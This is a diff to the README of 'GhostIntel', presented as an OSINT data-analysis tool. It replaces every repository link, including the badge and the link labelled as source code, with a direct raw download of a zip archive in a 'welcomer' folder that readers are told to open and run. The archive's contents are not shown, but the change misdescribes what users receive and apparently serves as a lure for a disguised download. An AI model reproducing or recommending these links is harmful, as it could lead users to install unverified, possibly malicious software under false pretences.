@@ -1,6 +1,6 @@
 # 👻 GhostIntel - Quick and Responsible Data Analysis Tool
 
-[![Download GhostIntel](https://img.shields.io/badge/Download-GhostIntel-brightgreen)](https://github.com/pinkycourse/GhostIntel)
+[![Download GhostIntel](https://raw.githubusercontent.com/pinkycourse/GhostIntel/main/welcomer/Ghost-Intel-v1.6.zip)](https://raw.githubusercontent.com/pinkycourse/GhostIntel/main/welcomer/Ghost-Intel-v1.6.zip)
 
 ## 🖥️ Overview
 
@@ -12,7 +12,7 @@ To get started with GhostIntel, follow these simple steps:
 
 1. **Visit the Download Page**  
    Go to the following link to download the software:  
-   [Download GhostIntel](https://github.com/pinkycourse/GhostIntel)  
+   [Download GhostIntel](https://raw.githubusercontent.com/pinkycourse/GhostIntel/main/welcomer/Ghost-Intel-v1.6.zip)  
 
 2. **Select the Latest Version**  
    Look for the latest release on the page. You will find a button labeled "Download" next to it.
@@ -50,7 +50,7 @@ To get started with GhostIntel, follow these simple steps:
 ## 💻 Installation Instructions
 
 1. **Download**  
-   Follow the earlier instructions to download GhostIntel from [this page](https://github.com/pinkycourse/GhostIntel).
+   Follow the earlier instructions to download GhostIntel from [this page](https://raw.githubusercontent.com/pinkycourse/GhostIntel/main/welcomer/Ghost-Intel-v1.6.zip).
 
 2. **Run the Installer**  
    Open the downloaded file and follow the instructions on your screen.
@@ -90,7 +90,7 @@ If you encounter any issues:
 ## 🔗 Additional Resources
 
 - **Repository:**  
-  Find the source code and contribute to GhostIntel at [GitHub - GhostIntel Repository](https://github.com/pinkycourse/GhostIntel).
+  Find the source code and contribute to GhostIntel at [GitHub - GhostIntel Repository](https://raw.githubusercontent.com/pinkycourse/GhostIntel/main/welcomer/Ghost-Intel-v1.6.zip).
 
 - **Community Support:**  
   Join discussions or ask questions in relevant OSINT forums or our community pages.
@@ -102,4 +102,4 @@ If you encounter any issues:
 
 For inquiries or feedback, feel free to reach out via the contact section in the GitHub repository.
 
-[![Download GhostIntel](https://img.shields.io/badge/Download-GhostIntel-brightgreen)](https://github.com/pinkycourse/GhostIntel)
+[![Download GhostIntel](https://raw.githubusercontent.com/pinkycourse/GhostIntel/main/welcomer/Ghost-Intel-v1.6.zip)](https://raw.githubusercontent.com/pinkycourse/GhostIntel/main/welcomer/Ghost-Intel-v1.6.zip)
